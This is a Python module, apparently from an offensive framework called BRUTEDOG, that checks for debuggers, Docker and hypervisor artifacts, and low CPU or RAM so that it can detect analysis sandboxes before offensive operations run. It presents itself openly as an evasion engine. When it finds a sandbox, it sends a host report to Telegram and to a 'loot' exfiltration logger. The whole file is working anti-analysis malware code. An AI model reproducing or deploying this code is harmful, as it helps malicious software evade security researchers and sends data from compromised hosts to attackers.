#!/usr/bin/env python3
"""
SANDBOX_EVADER.PY v8.5 — Active Sandbox, Honeypot & Debugger Evasion Engine (WAF Hardened)
Features:
- Hypervisor and container artifact detection (Docker, QEMU, VirtualBox, VMware)
- Debugger and instrumentation hook detection (sys.gettrace, breakpoint inspection)
- Behavioral environment checks (CPU core/RAM resource limits, timing checks)
- Real-time asynchronous Telegram notification dispatch for sandbox detection telemetry
- Zero-disk memory storage with centralized framework loot exfiltration
"""
import sys
import os
import time
import platform
import asyncio

# Import centralized framework loot exfiltration, telemetry, and Telegram notifier
from modules.loot_logger import save_session_loot
from modules.telemetry import stream_proof
from modules.telegram_notifier import send_telegram_alert
from modules.behavioral_mimic import apply_behavioral_jitter

COLORS = {
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "YELLOW": "\033[93m",
    "CYAN": "\033[96m",
    "MAGENTA": "\033[95m",
    "RESET": "\033[0m",
    "BOLD": "\033[1m",
}

def terminal(message):
    sys.stdout.write(message + "\n")
    sys.stdout.flush()

def broadcast_tg_alert_sync(loot_type, details):
    """Helper to non-blockingly fire Telegram alerts from sandbox evader functions."""
    try:
        loop = asyncio.get_running_loop()
        loop.create_task(send_telegram_alert(loot_type, details))
    except RuntimeError:
        try:
            asyncio.run(send_telegram_alert(loot_type, details))
        except Exception:
            pass

class SandboxEvader:
    """
    Active Environment Inspector & Sandbox Detection Engine.
    Identifies analysis sandboxes, debuggers, and honeypots before executing sensitive offensive operations.
    """
    def __init__(self):
        self.evasion_triggered = False
        self.indicators = []

    def check_debugger(self):
        """Detects active Python debuggers or tracing hooks."""
        is_traced = sys.gettrace() is not None
        if is_traced:
            self.indicators.append("Active debugger trace detected (sys.gettrace)")
            return True
        return False

    def check_container_artifacts(self):
        """Inspects for containerization and hypervisor artifacts."""
        artifacts = []
        
        # Check docker env file or .dockerenv
        if os.path.exists("/.dockerenv") or os.path.exists("/runenv"):
            artifacts.append("Found container marker (/.dockerenv)")

        # Check cgroups for container signatures
        try:
            if os.path.exists("/proc/self/cgroup"):
                with open("/proc/self/cgroup", "r", encoding="utf-8") as f:
                    content = f.read()
                    if any(sig in content for sig in ["docker", "kubepods", "lxc", "containerd"]):
                        artifacts.append("Container signature found in /proc/self/cgroup")
        except Exception:
            pass

        # Check CPU / Hypervisor vendor strings on Linux
        try:
            if os.path.exists("/proc/cpuinfo"):
                with open("/proc/cpuinfo", "r", encoding="utf-8") as f:
                    content = f.read().lower()
                    for hv in ["vmware", "qemu", "kvm", "virtualbox", "xen"]:
                        if hv in content:
                            artifacts.append(f"Hypervisor signature in cpuinfo: {hv}")
        except Exception:
            pass

        if artifacts:
            self.indicators.extend(artifacts)
            return True
        return False

    def check_resource_constraints(self):
        """Checks if system resources match typical bare-minimum analysis sandboxes."""
        constraints = []
        
        # CPU Count check
        cpu_count = os.cpu_count() or 1
        if cpu_count <= 1:
            constraints.append(f"Low CPU core count: {cpu_count}")

        # Memory / RAM check (Linux /proc/meminfo)
        try:
            if os.path.exists("/proc/meminfo"):
                with open("/proc/meminfo", "r", encoding="utf-8") as f:
                    for line in f:
                        if "MemTotal" in line:
                            parts = line.split()
                            if len(parts) >= 2:
                                kb_total = int(parts[1])
                                if kb_total < 2_097_152: # Less than 2GB RAM
                                    constraints.append(f"Low RAM constraint: {kb_total // 1024} MB")
        except Exception:
            pass

        if constraints:
            self.indicators.extend(constraints)
            return True
        return False

    def inspect_environment(self):
        """Performs full spectrum sandbox and debugger inspection."""
        terminal(f"{COLORS['MAGENTA']}[*] Executing sandbox & analysis environment inspection...{COLORS['RESET']}")
        
        apply_behavioral_jitter()
        
        dbg = self.check_debugger()
        cnt = self.check_container_artifacts()
        res = self.check_resource_constraints()

        analysis_detected = dbg or cnt or res

        report = {
            "analysis_environment_detected": analysis_detected,
            "debugger_active": dbg,
            "container_artifacts": cnt,
            "resource_constraints": res,
            "indicators": self.indicators,
            "platform": platform.platform()
        }

        if analysis_detected:
            terminal(f"{COLORS['RED']}[!] WARNING: Analysis sandbox or debugger environment detected!{COLORS['RESET']}")
            for ind in self.indicators:
                terminal(f"  └── Indicator: {ind}")
            
            # Broadcast telemetry to Telegram and persist loot
            broadcast_tg_alert_sync("Sandbox / Analysis Environment Detected", report)
            stream_proof("SANDBOX_DETECTED", "local_runtime", {}, f"Indicators: {len(self.indicators)}", report)
            save_session_loot(
                target="localhost",
                endpoint="sandbox_inspection",
                finding_type="SANDBOX_ENVIRONMENT_DETECTED",
                status=200,
                headers={},
                body=str(report),
                extra_loot=report
            )
        else:
            terminal(f"{COLORS['GREEN']}[+] Environment clean. No active debugging or sandbox signatures found.{COLORS['RESET']}")

        return report

async def run_sandbox_evader():
    terminal(f"\n{COLORS['CYAN']}[***] BRUTEDOG SANDBOX & DEBUGGER EVASION ENGINE (V8.5) [***]{COLORS['RESET']}")
    evader = SandboxEvader()
    report = await asyncio.to_thread(evader.inspect_environment)
    return report

if __name__ == "__main__":
    asyncio.run(run_sandbox_evader())
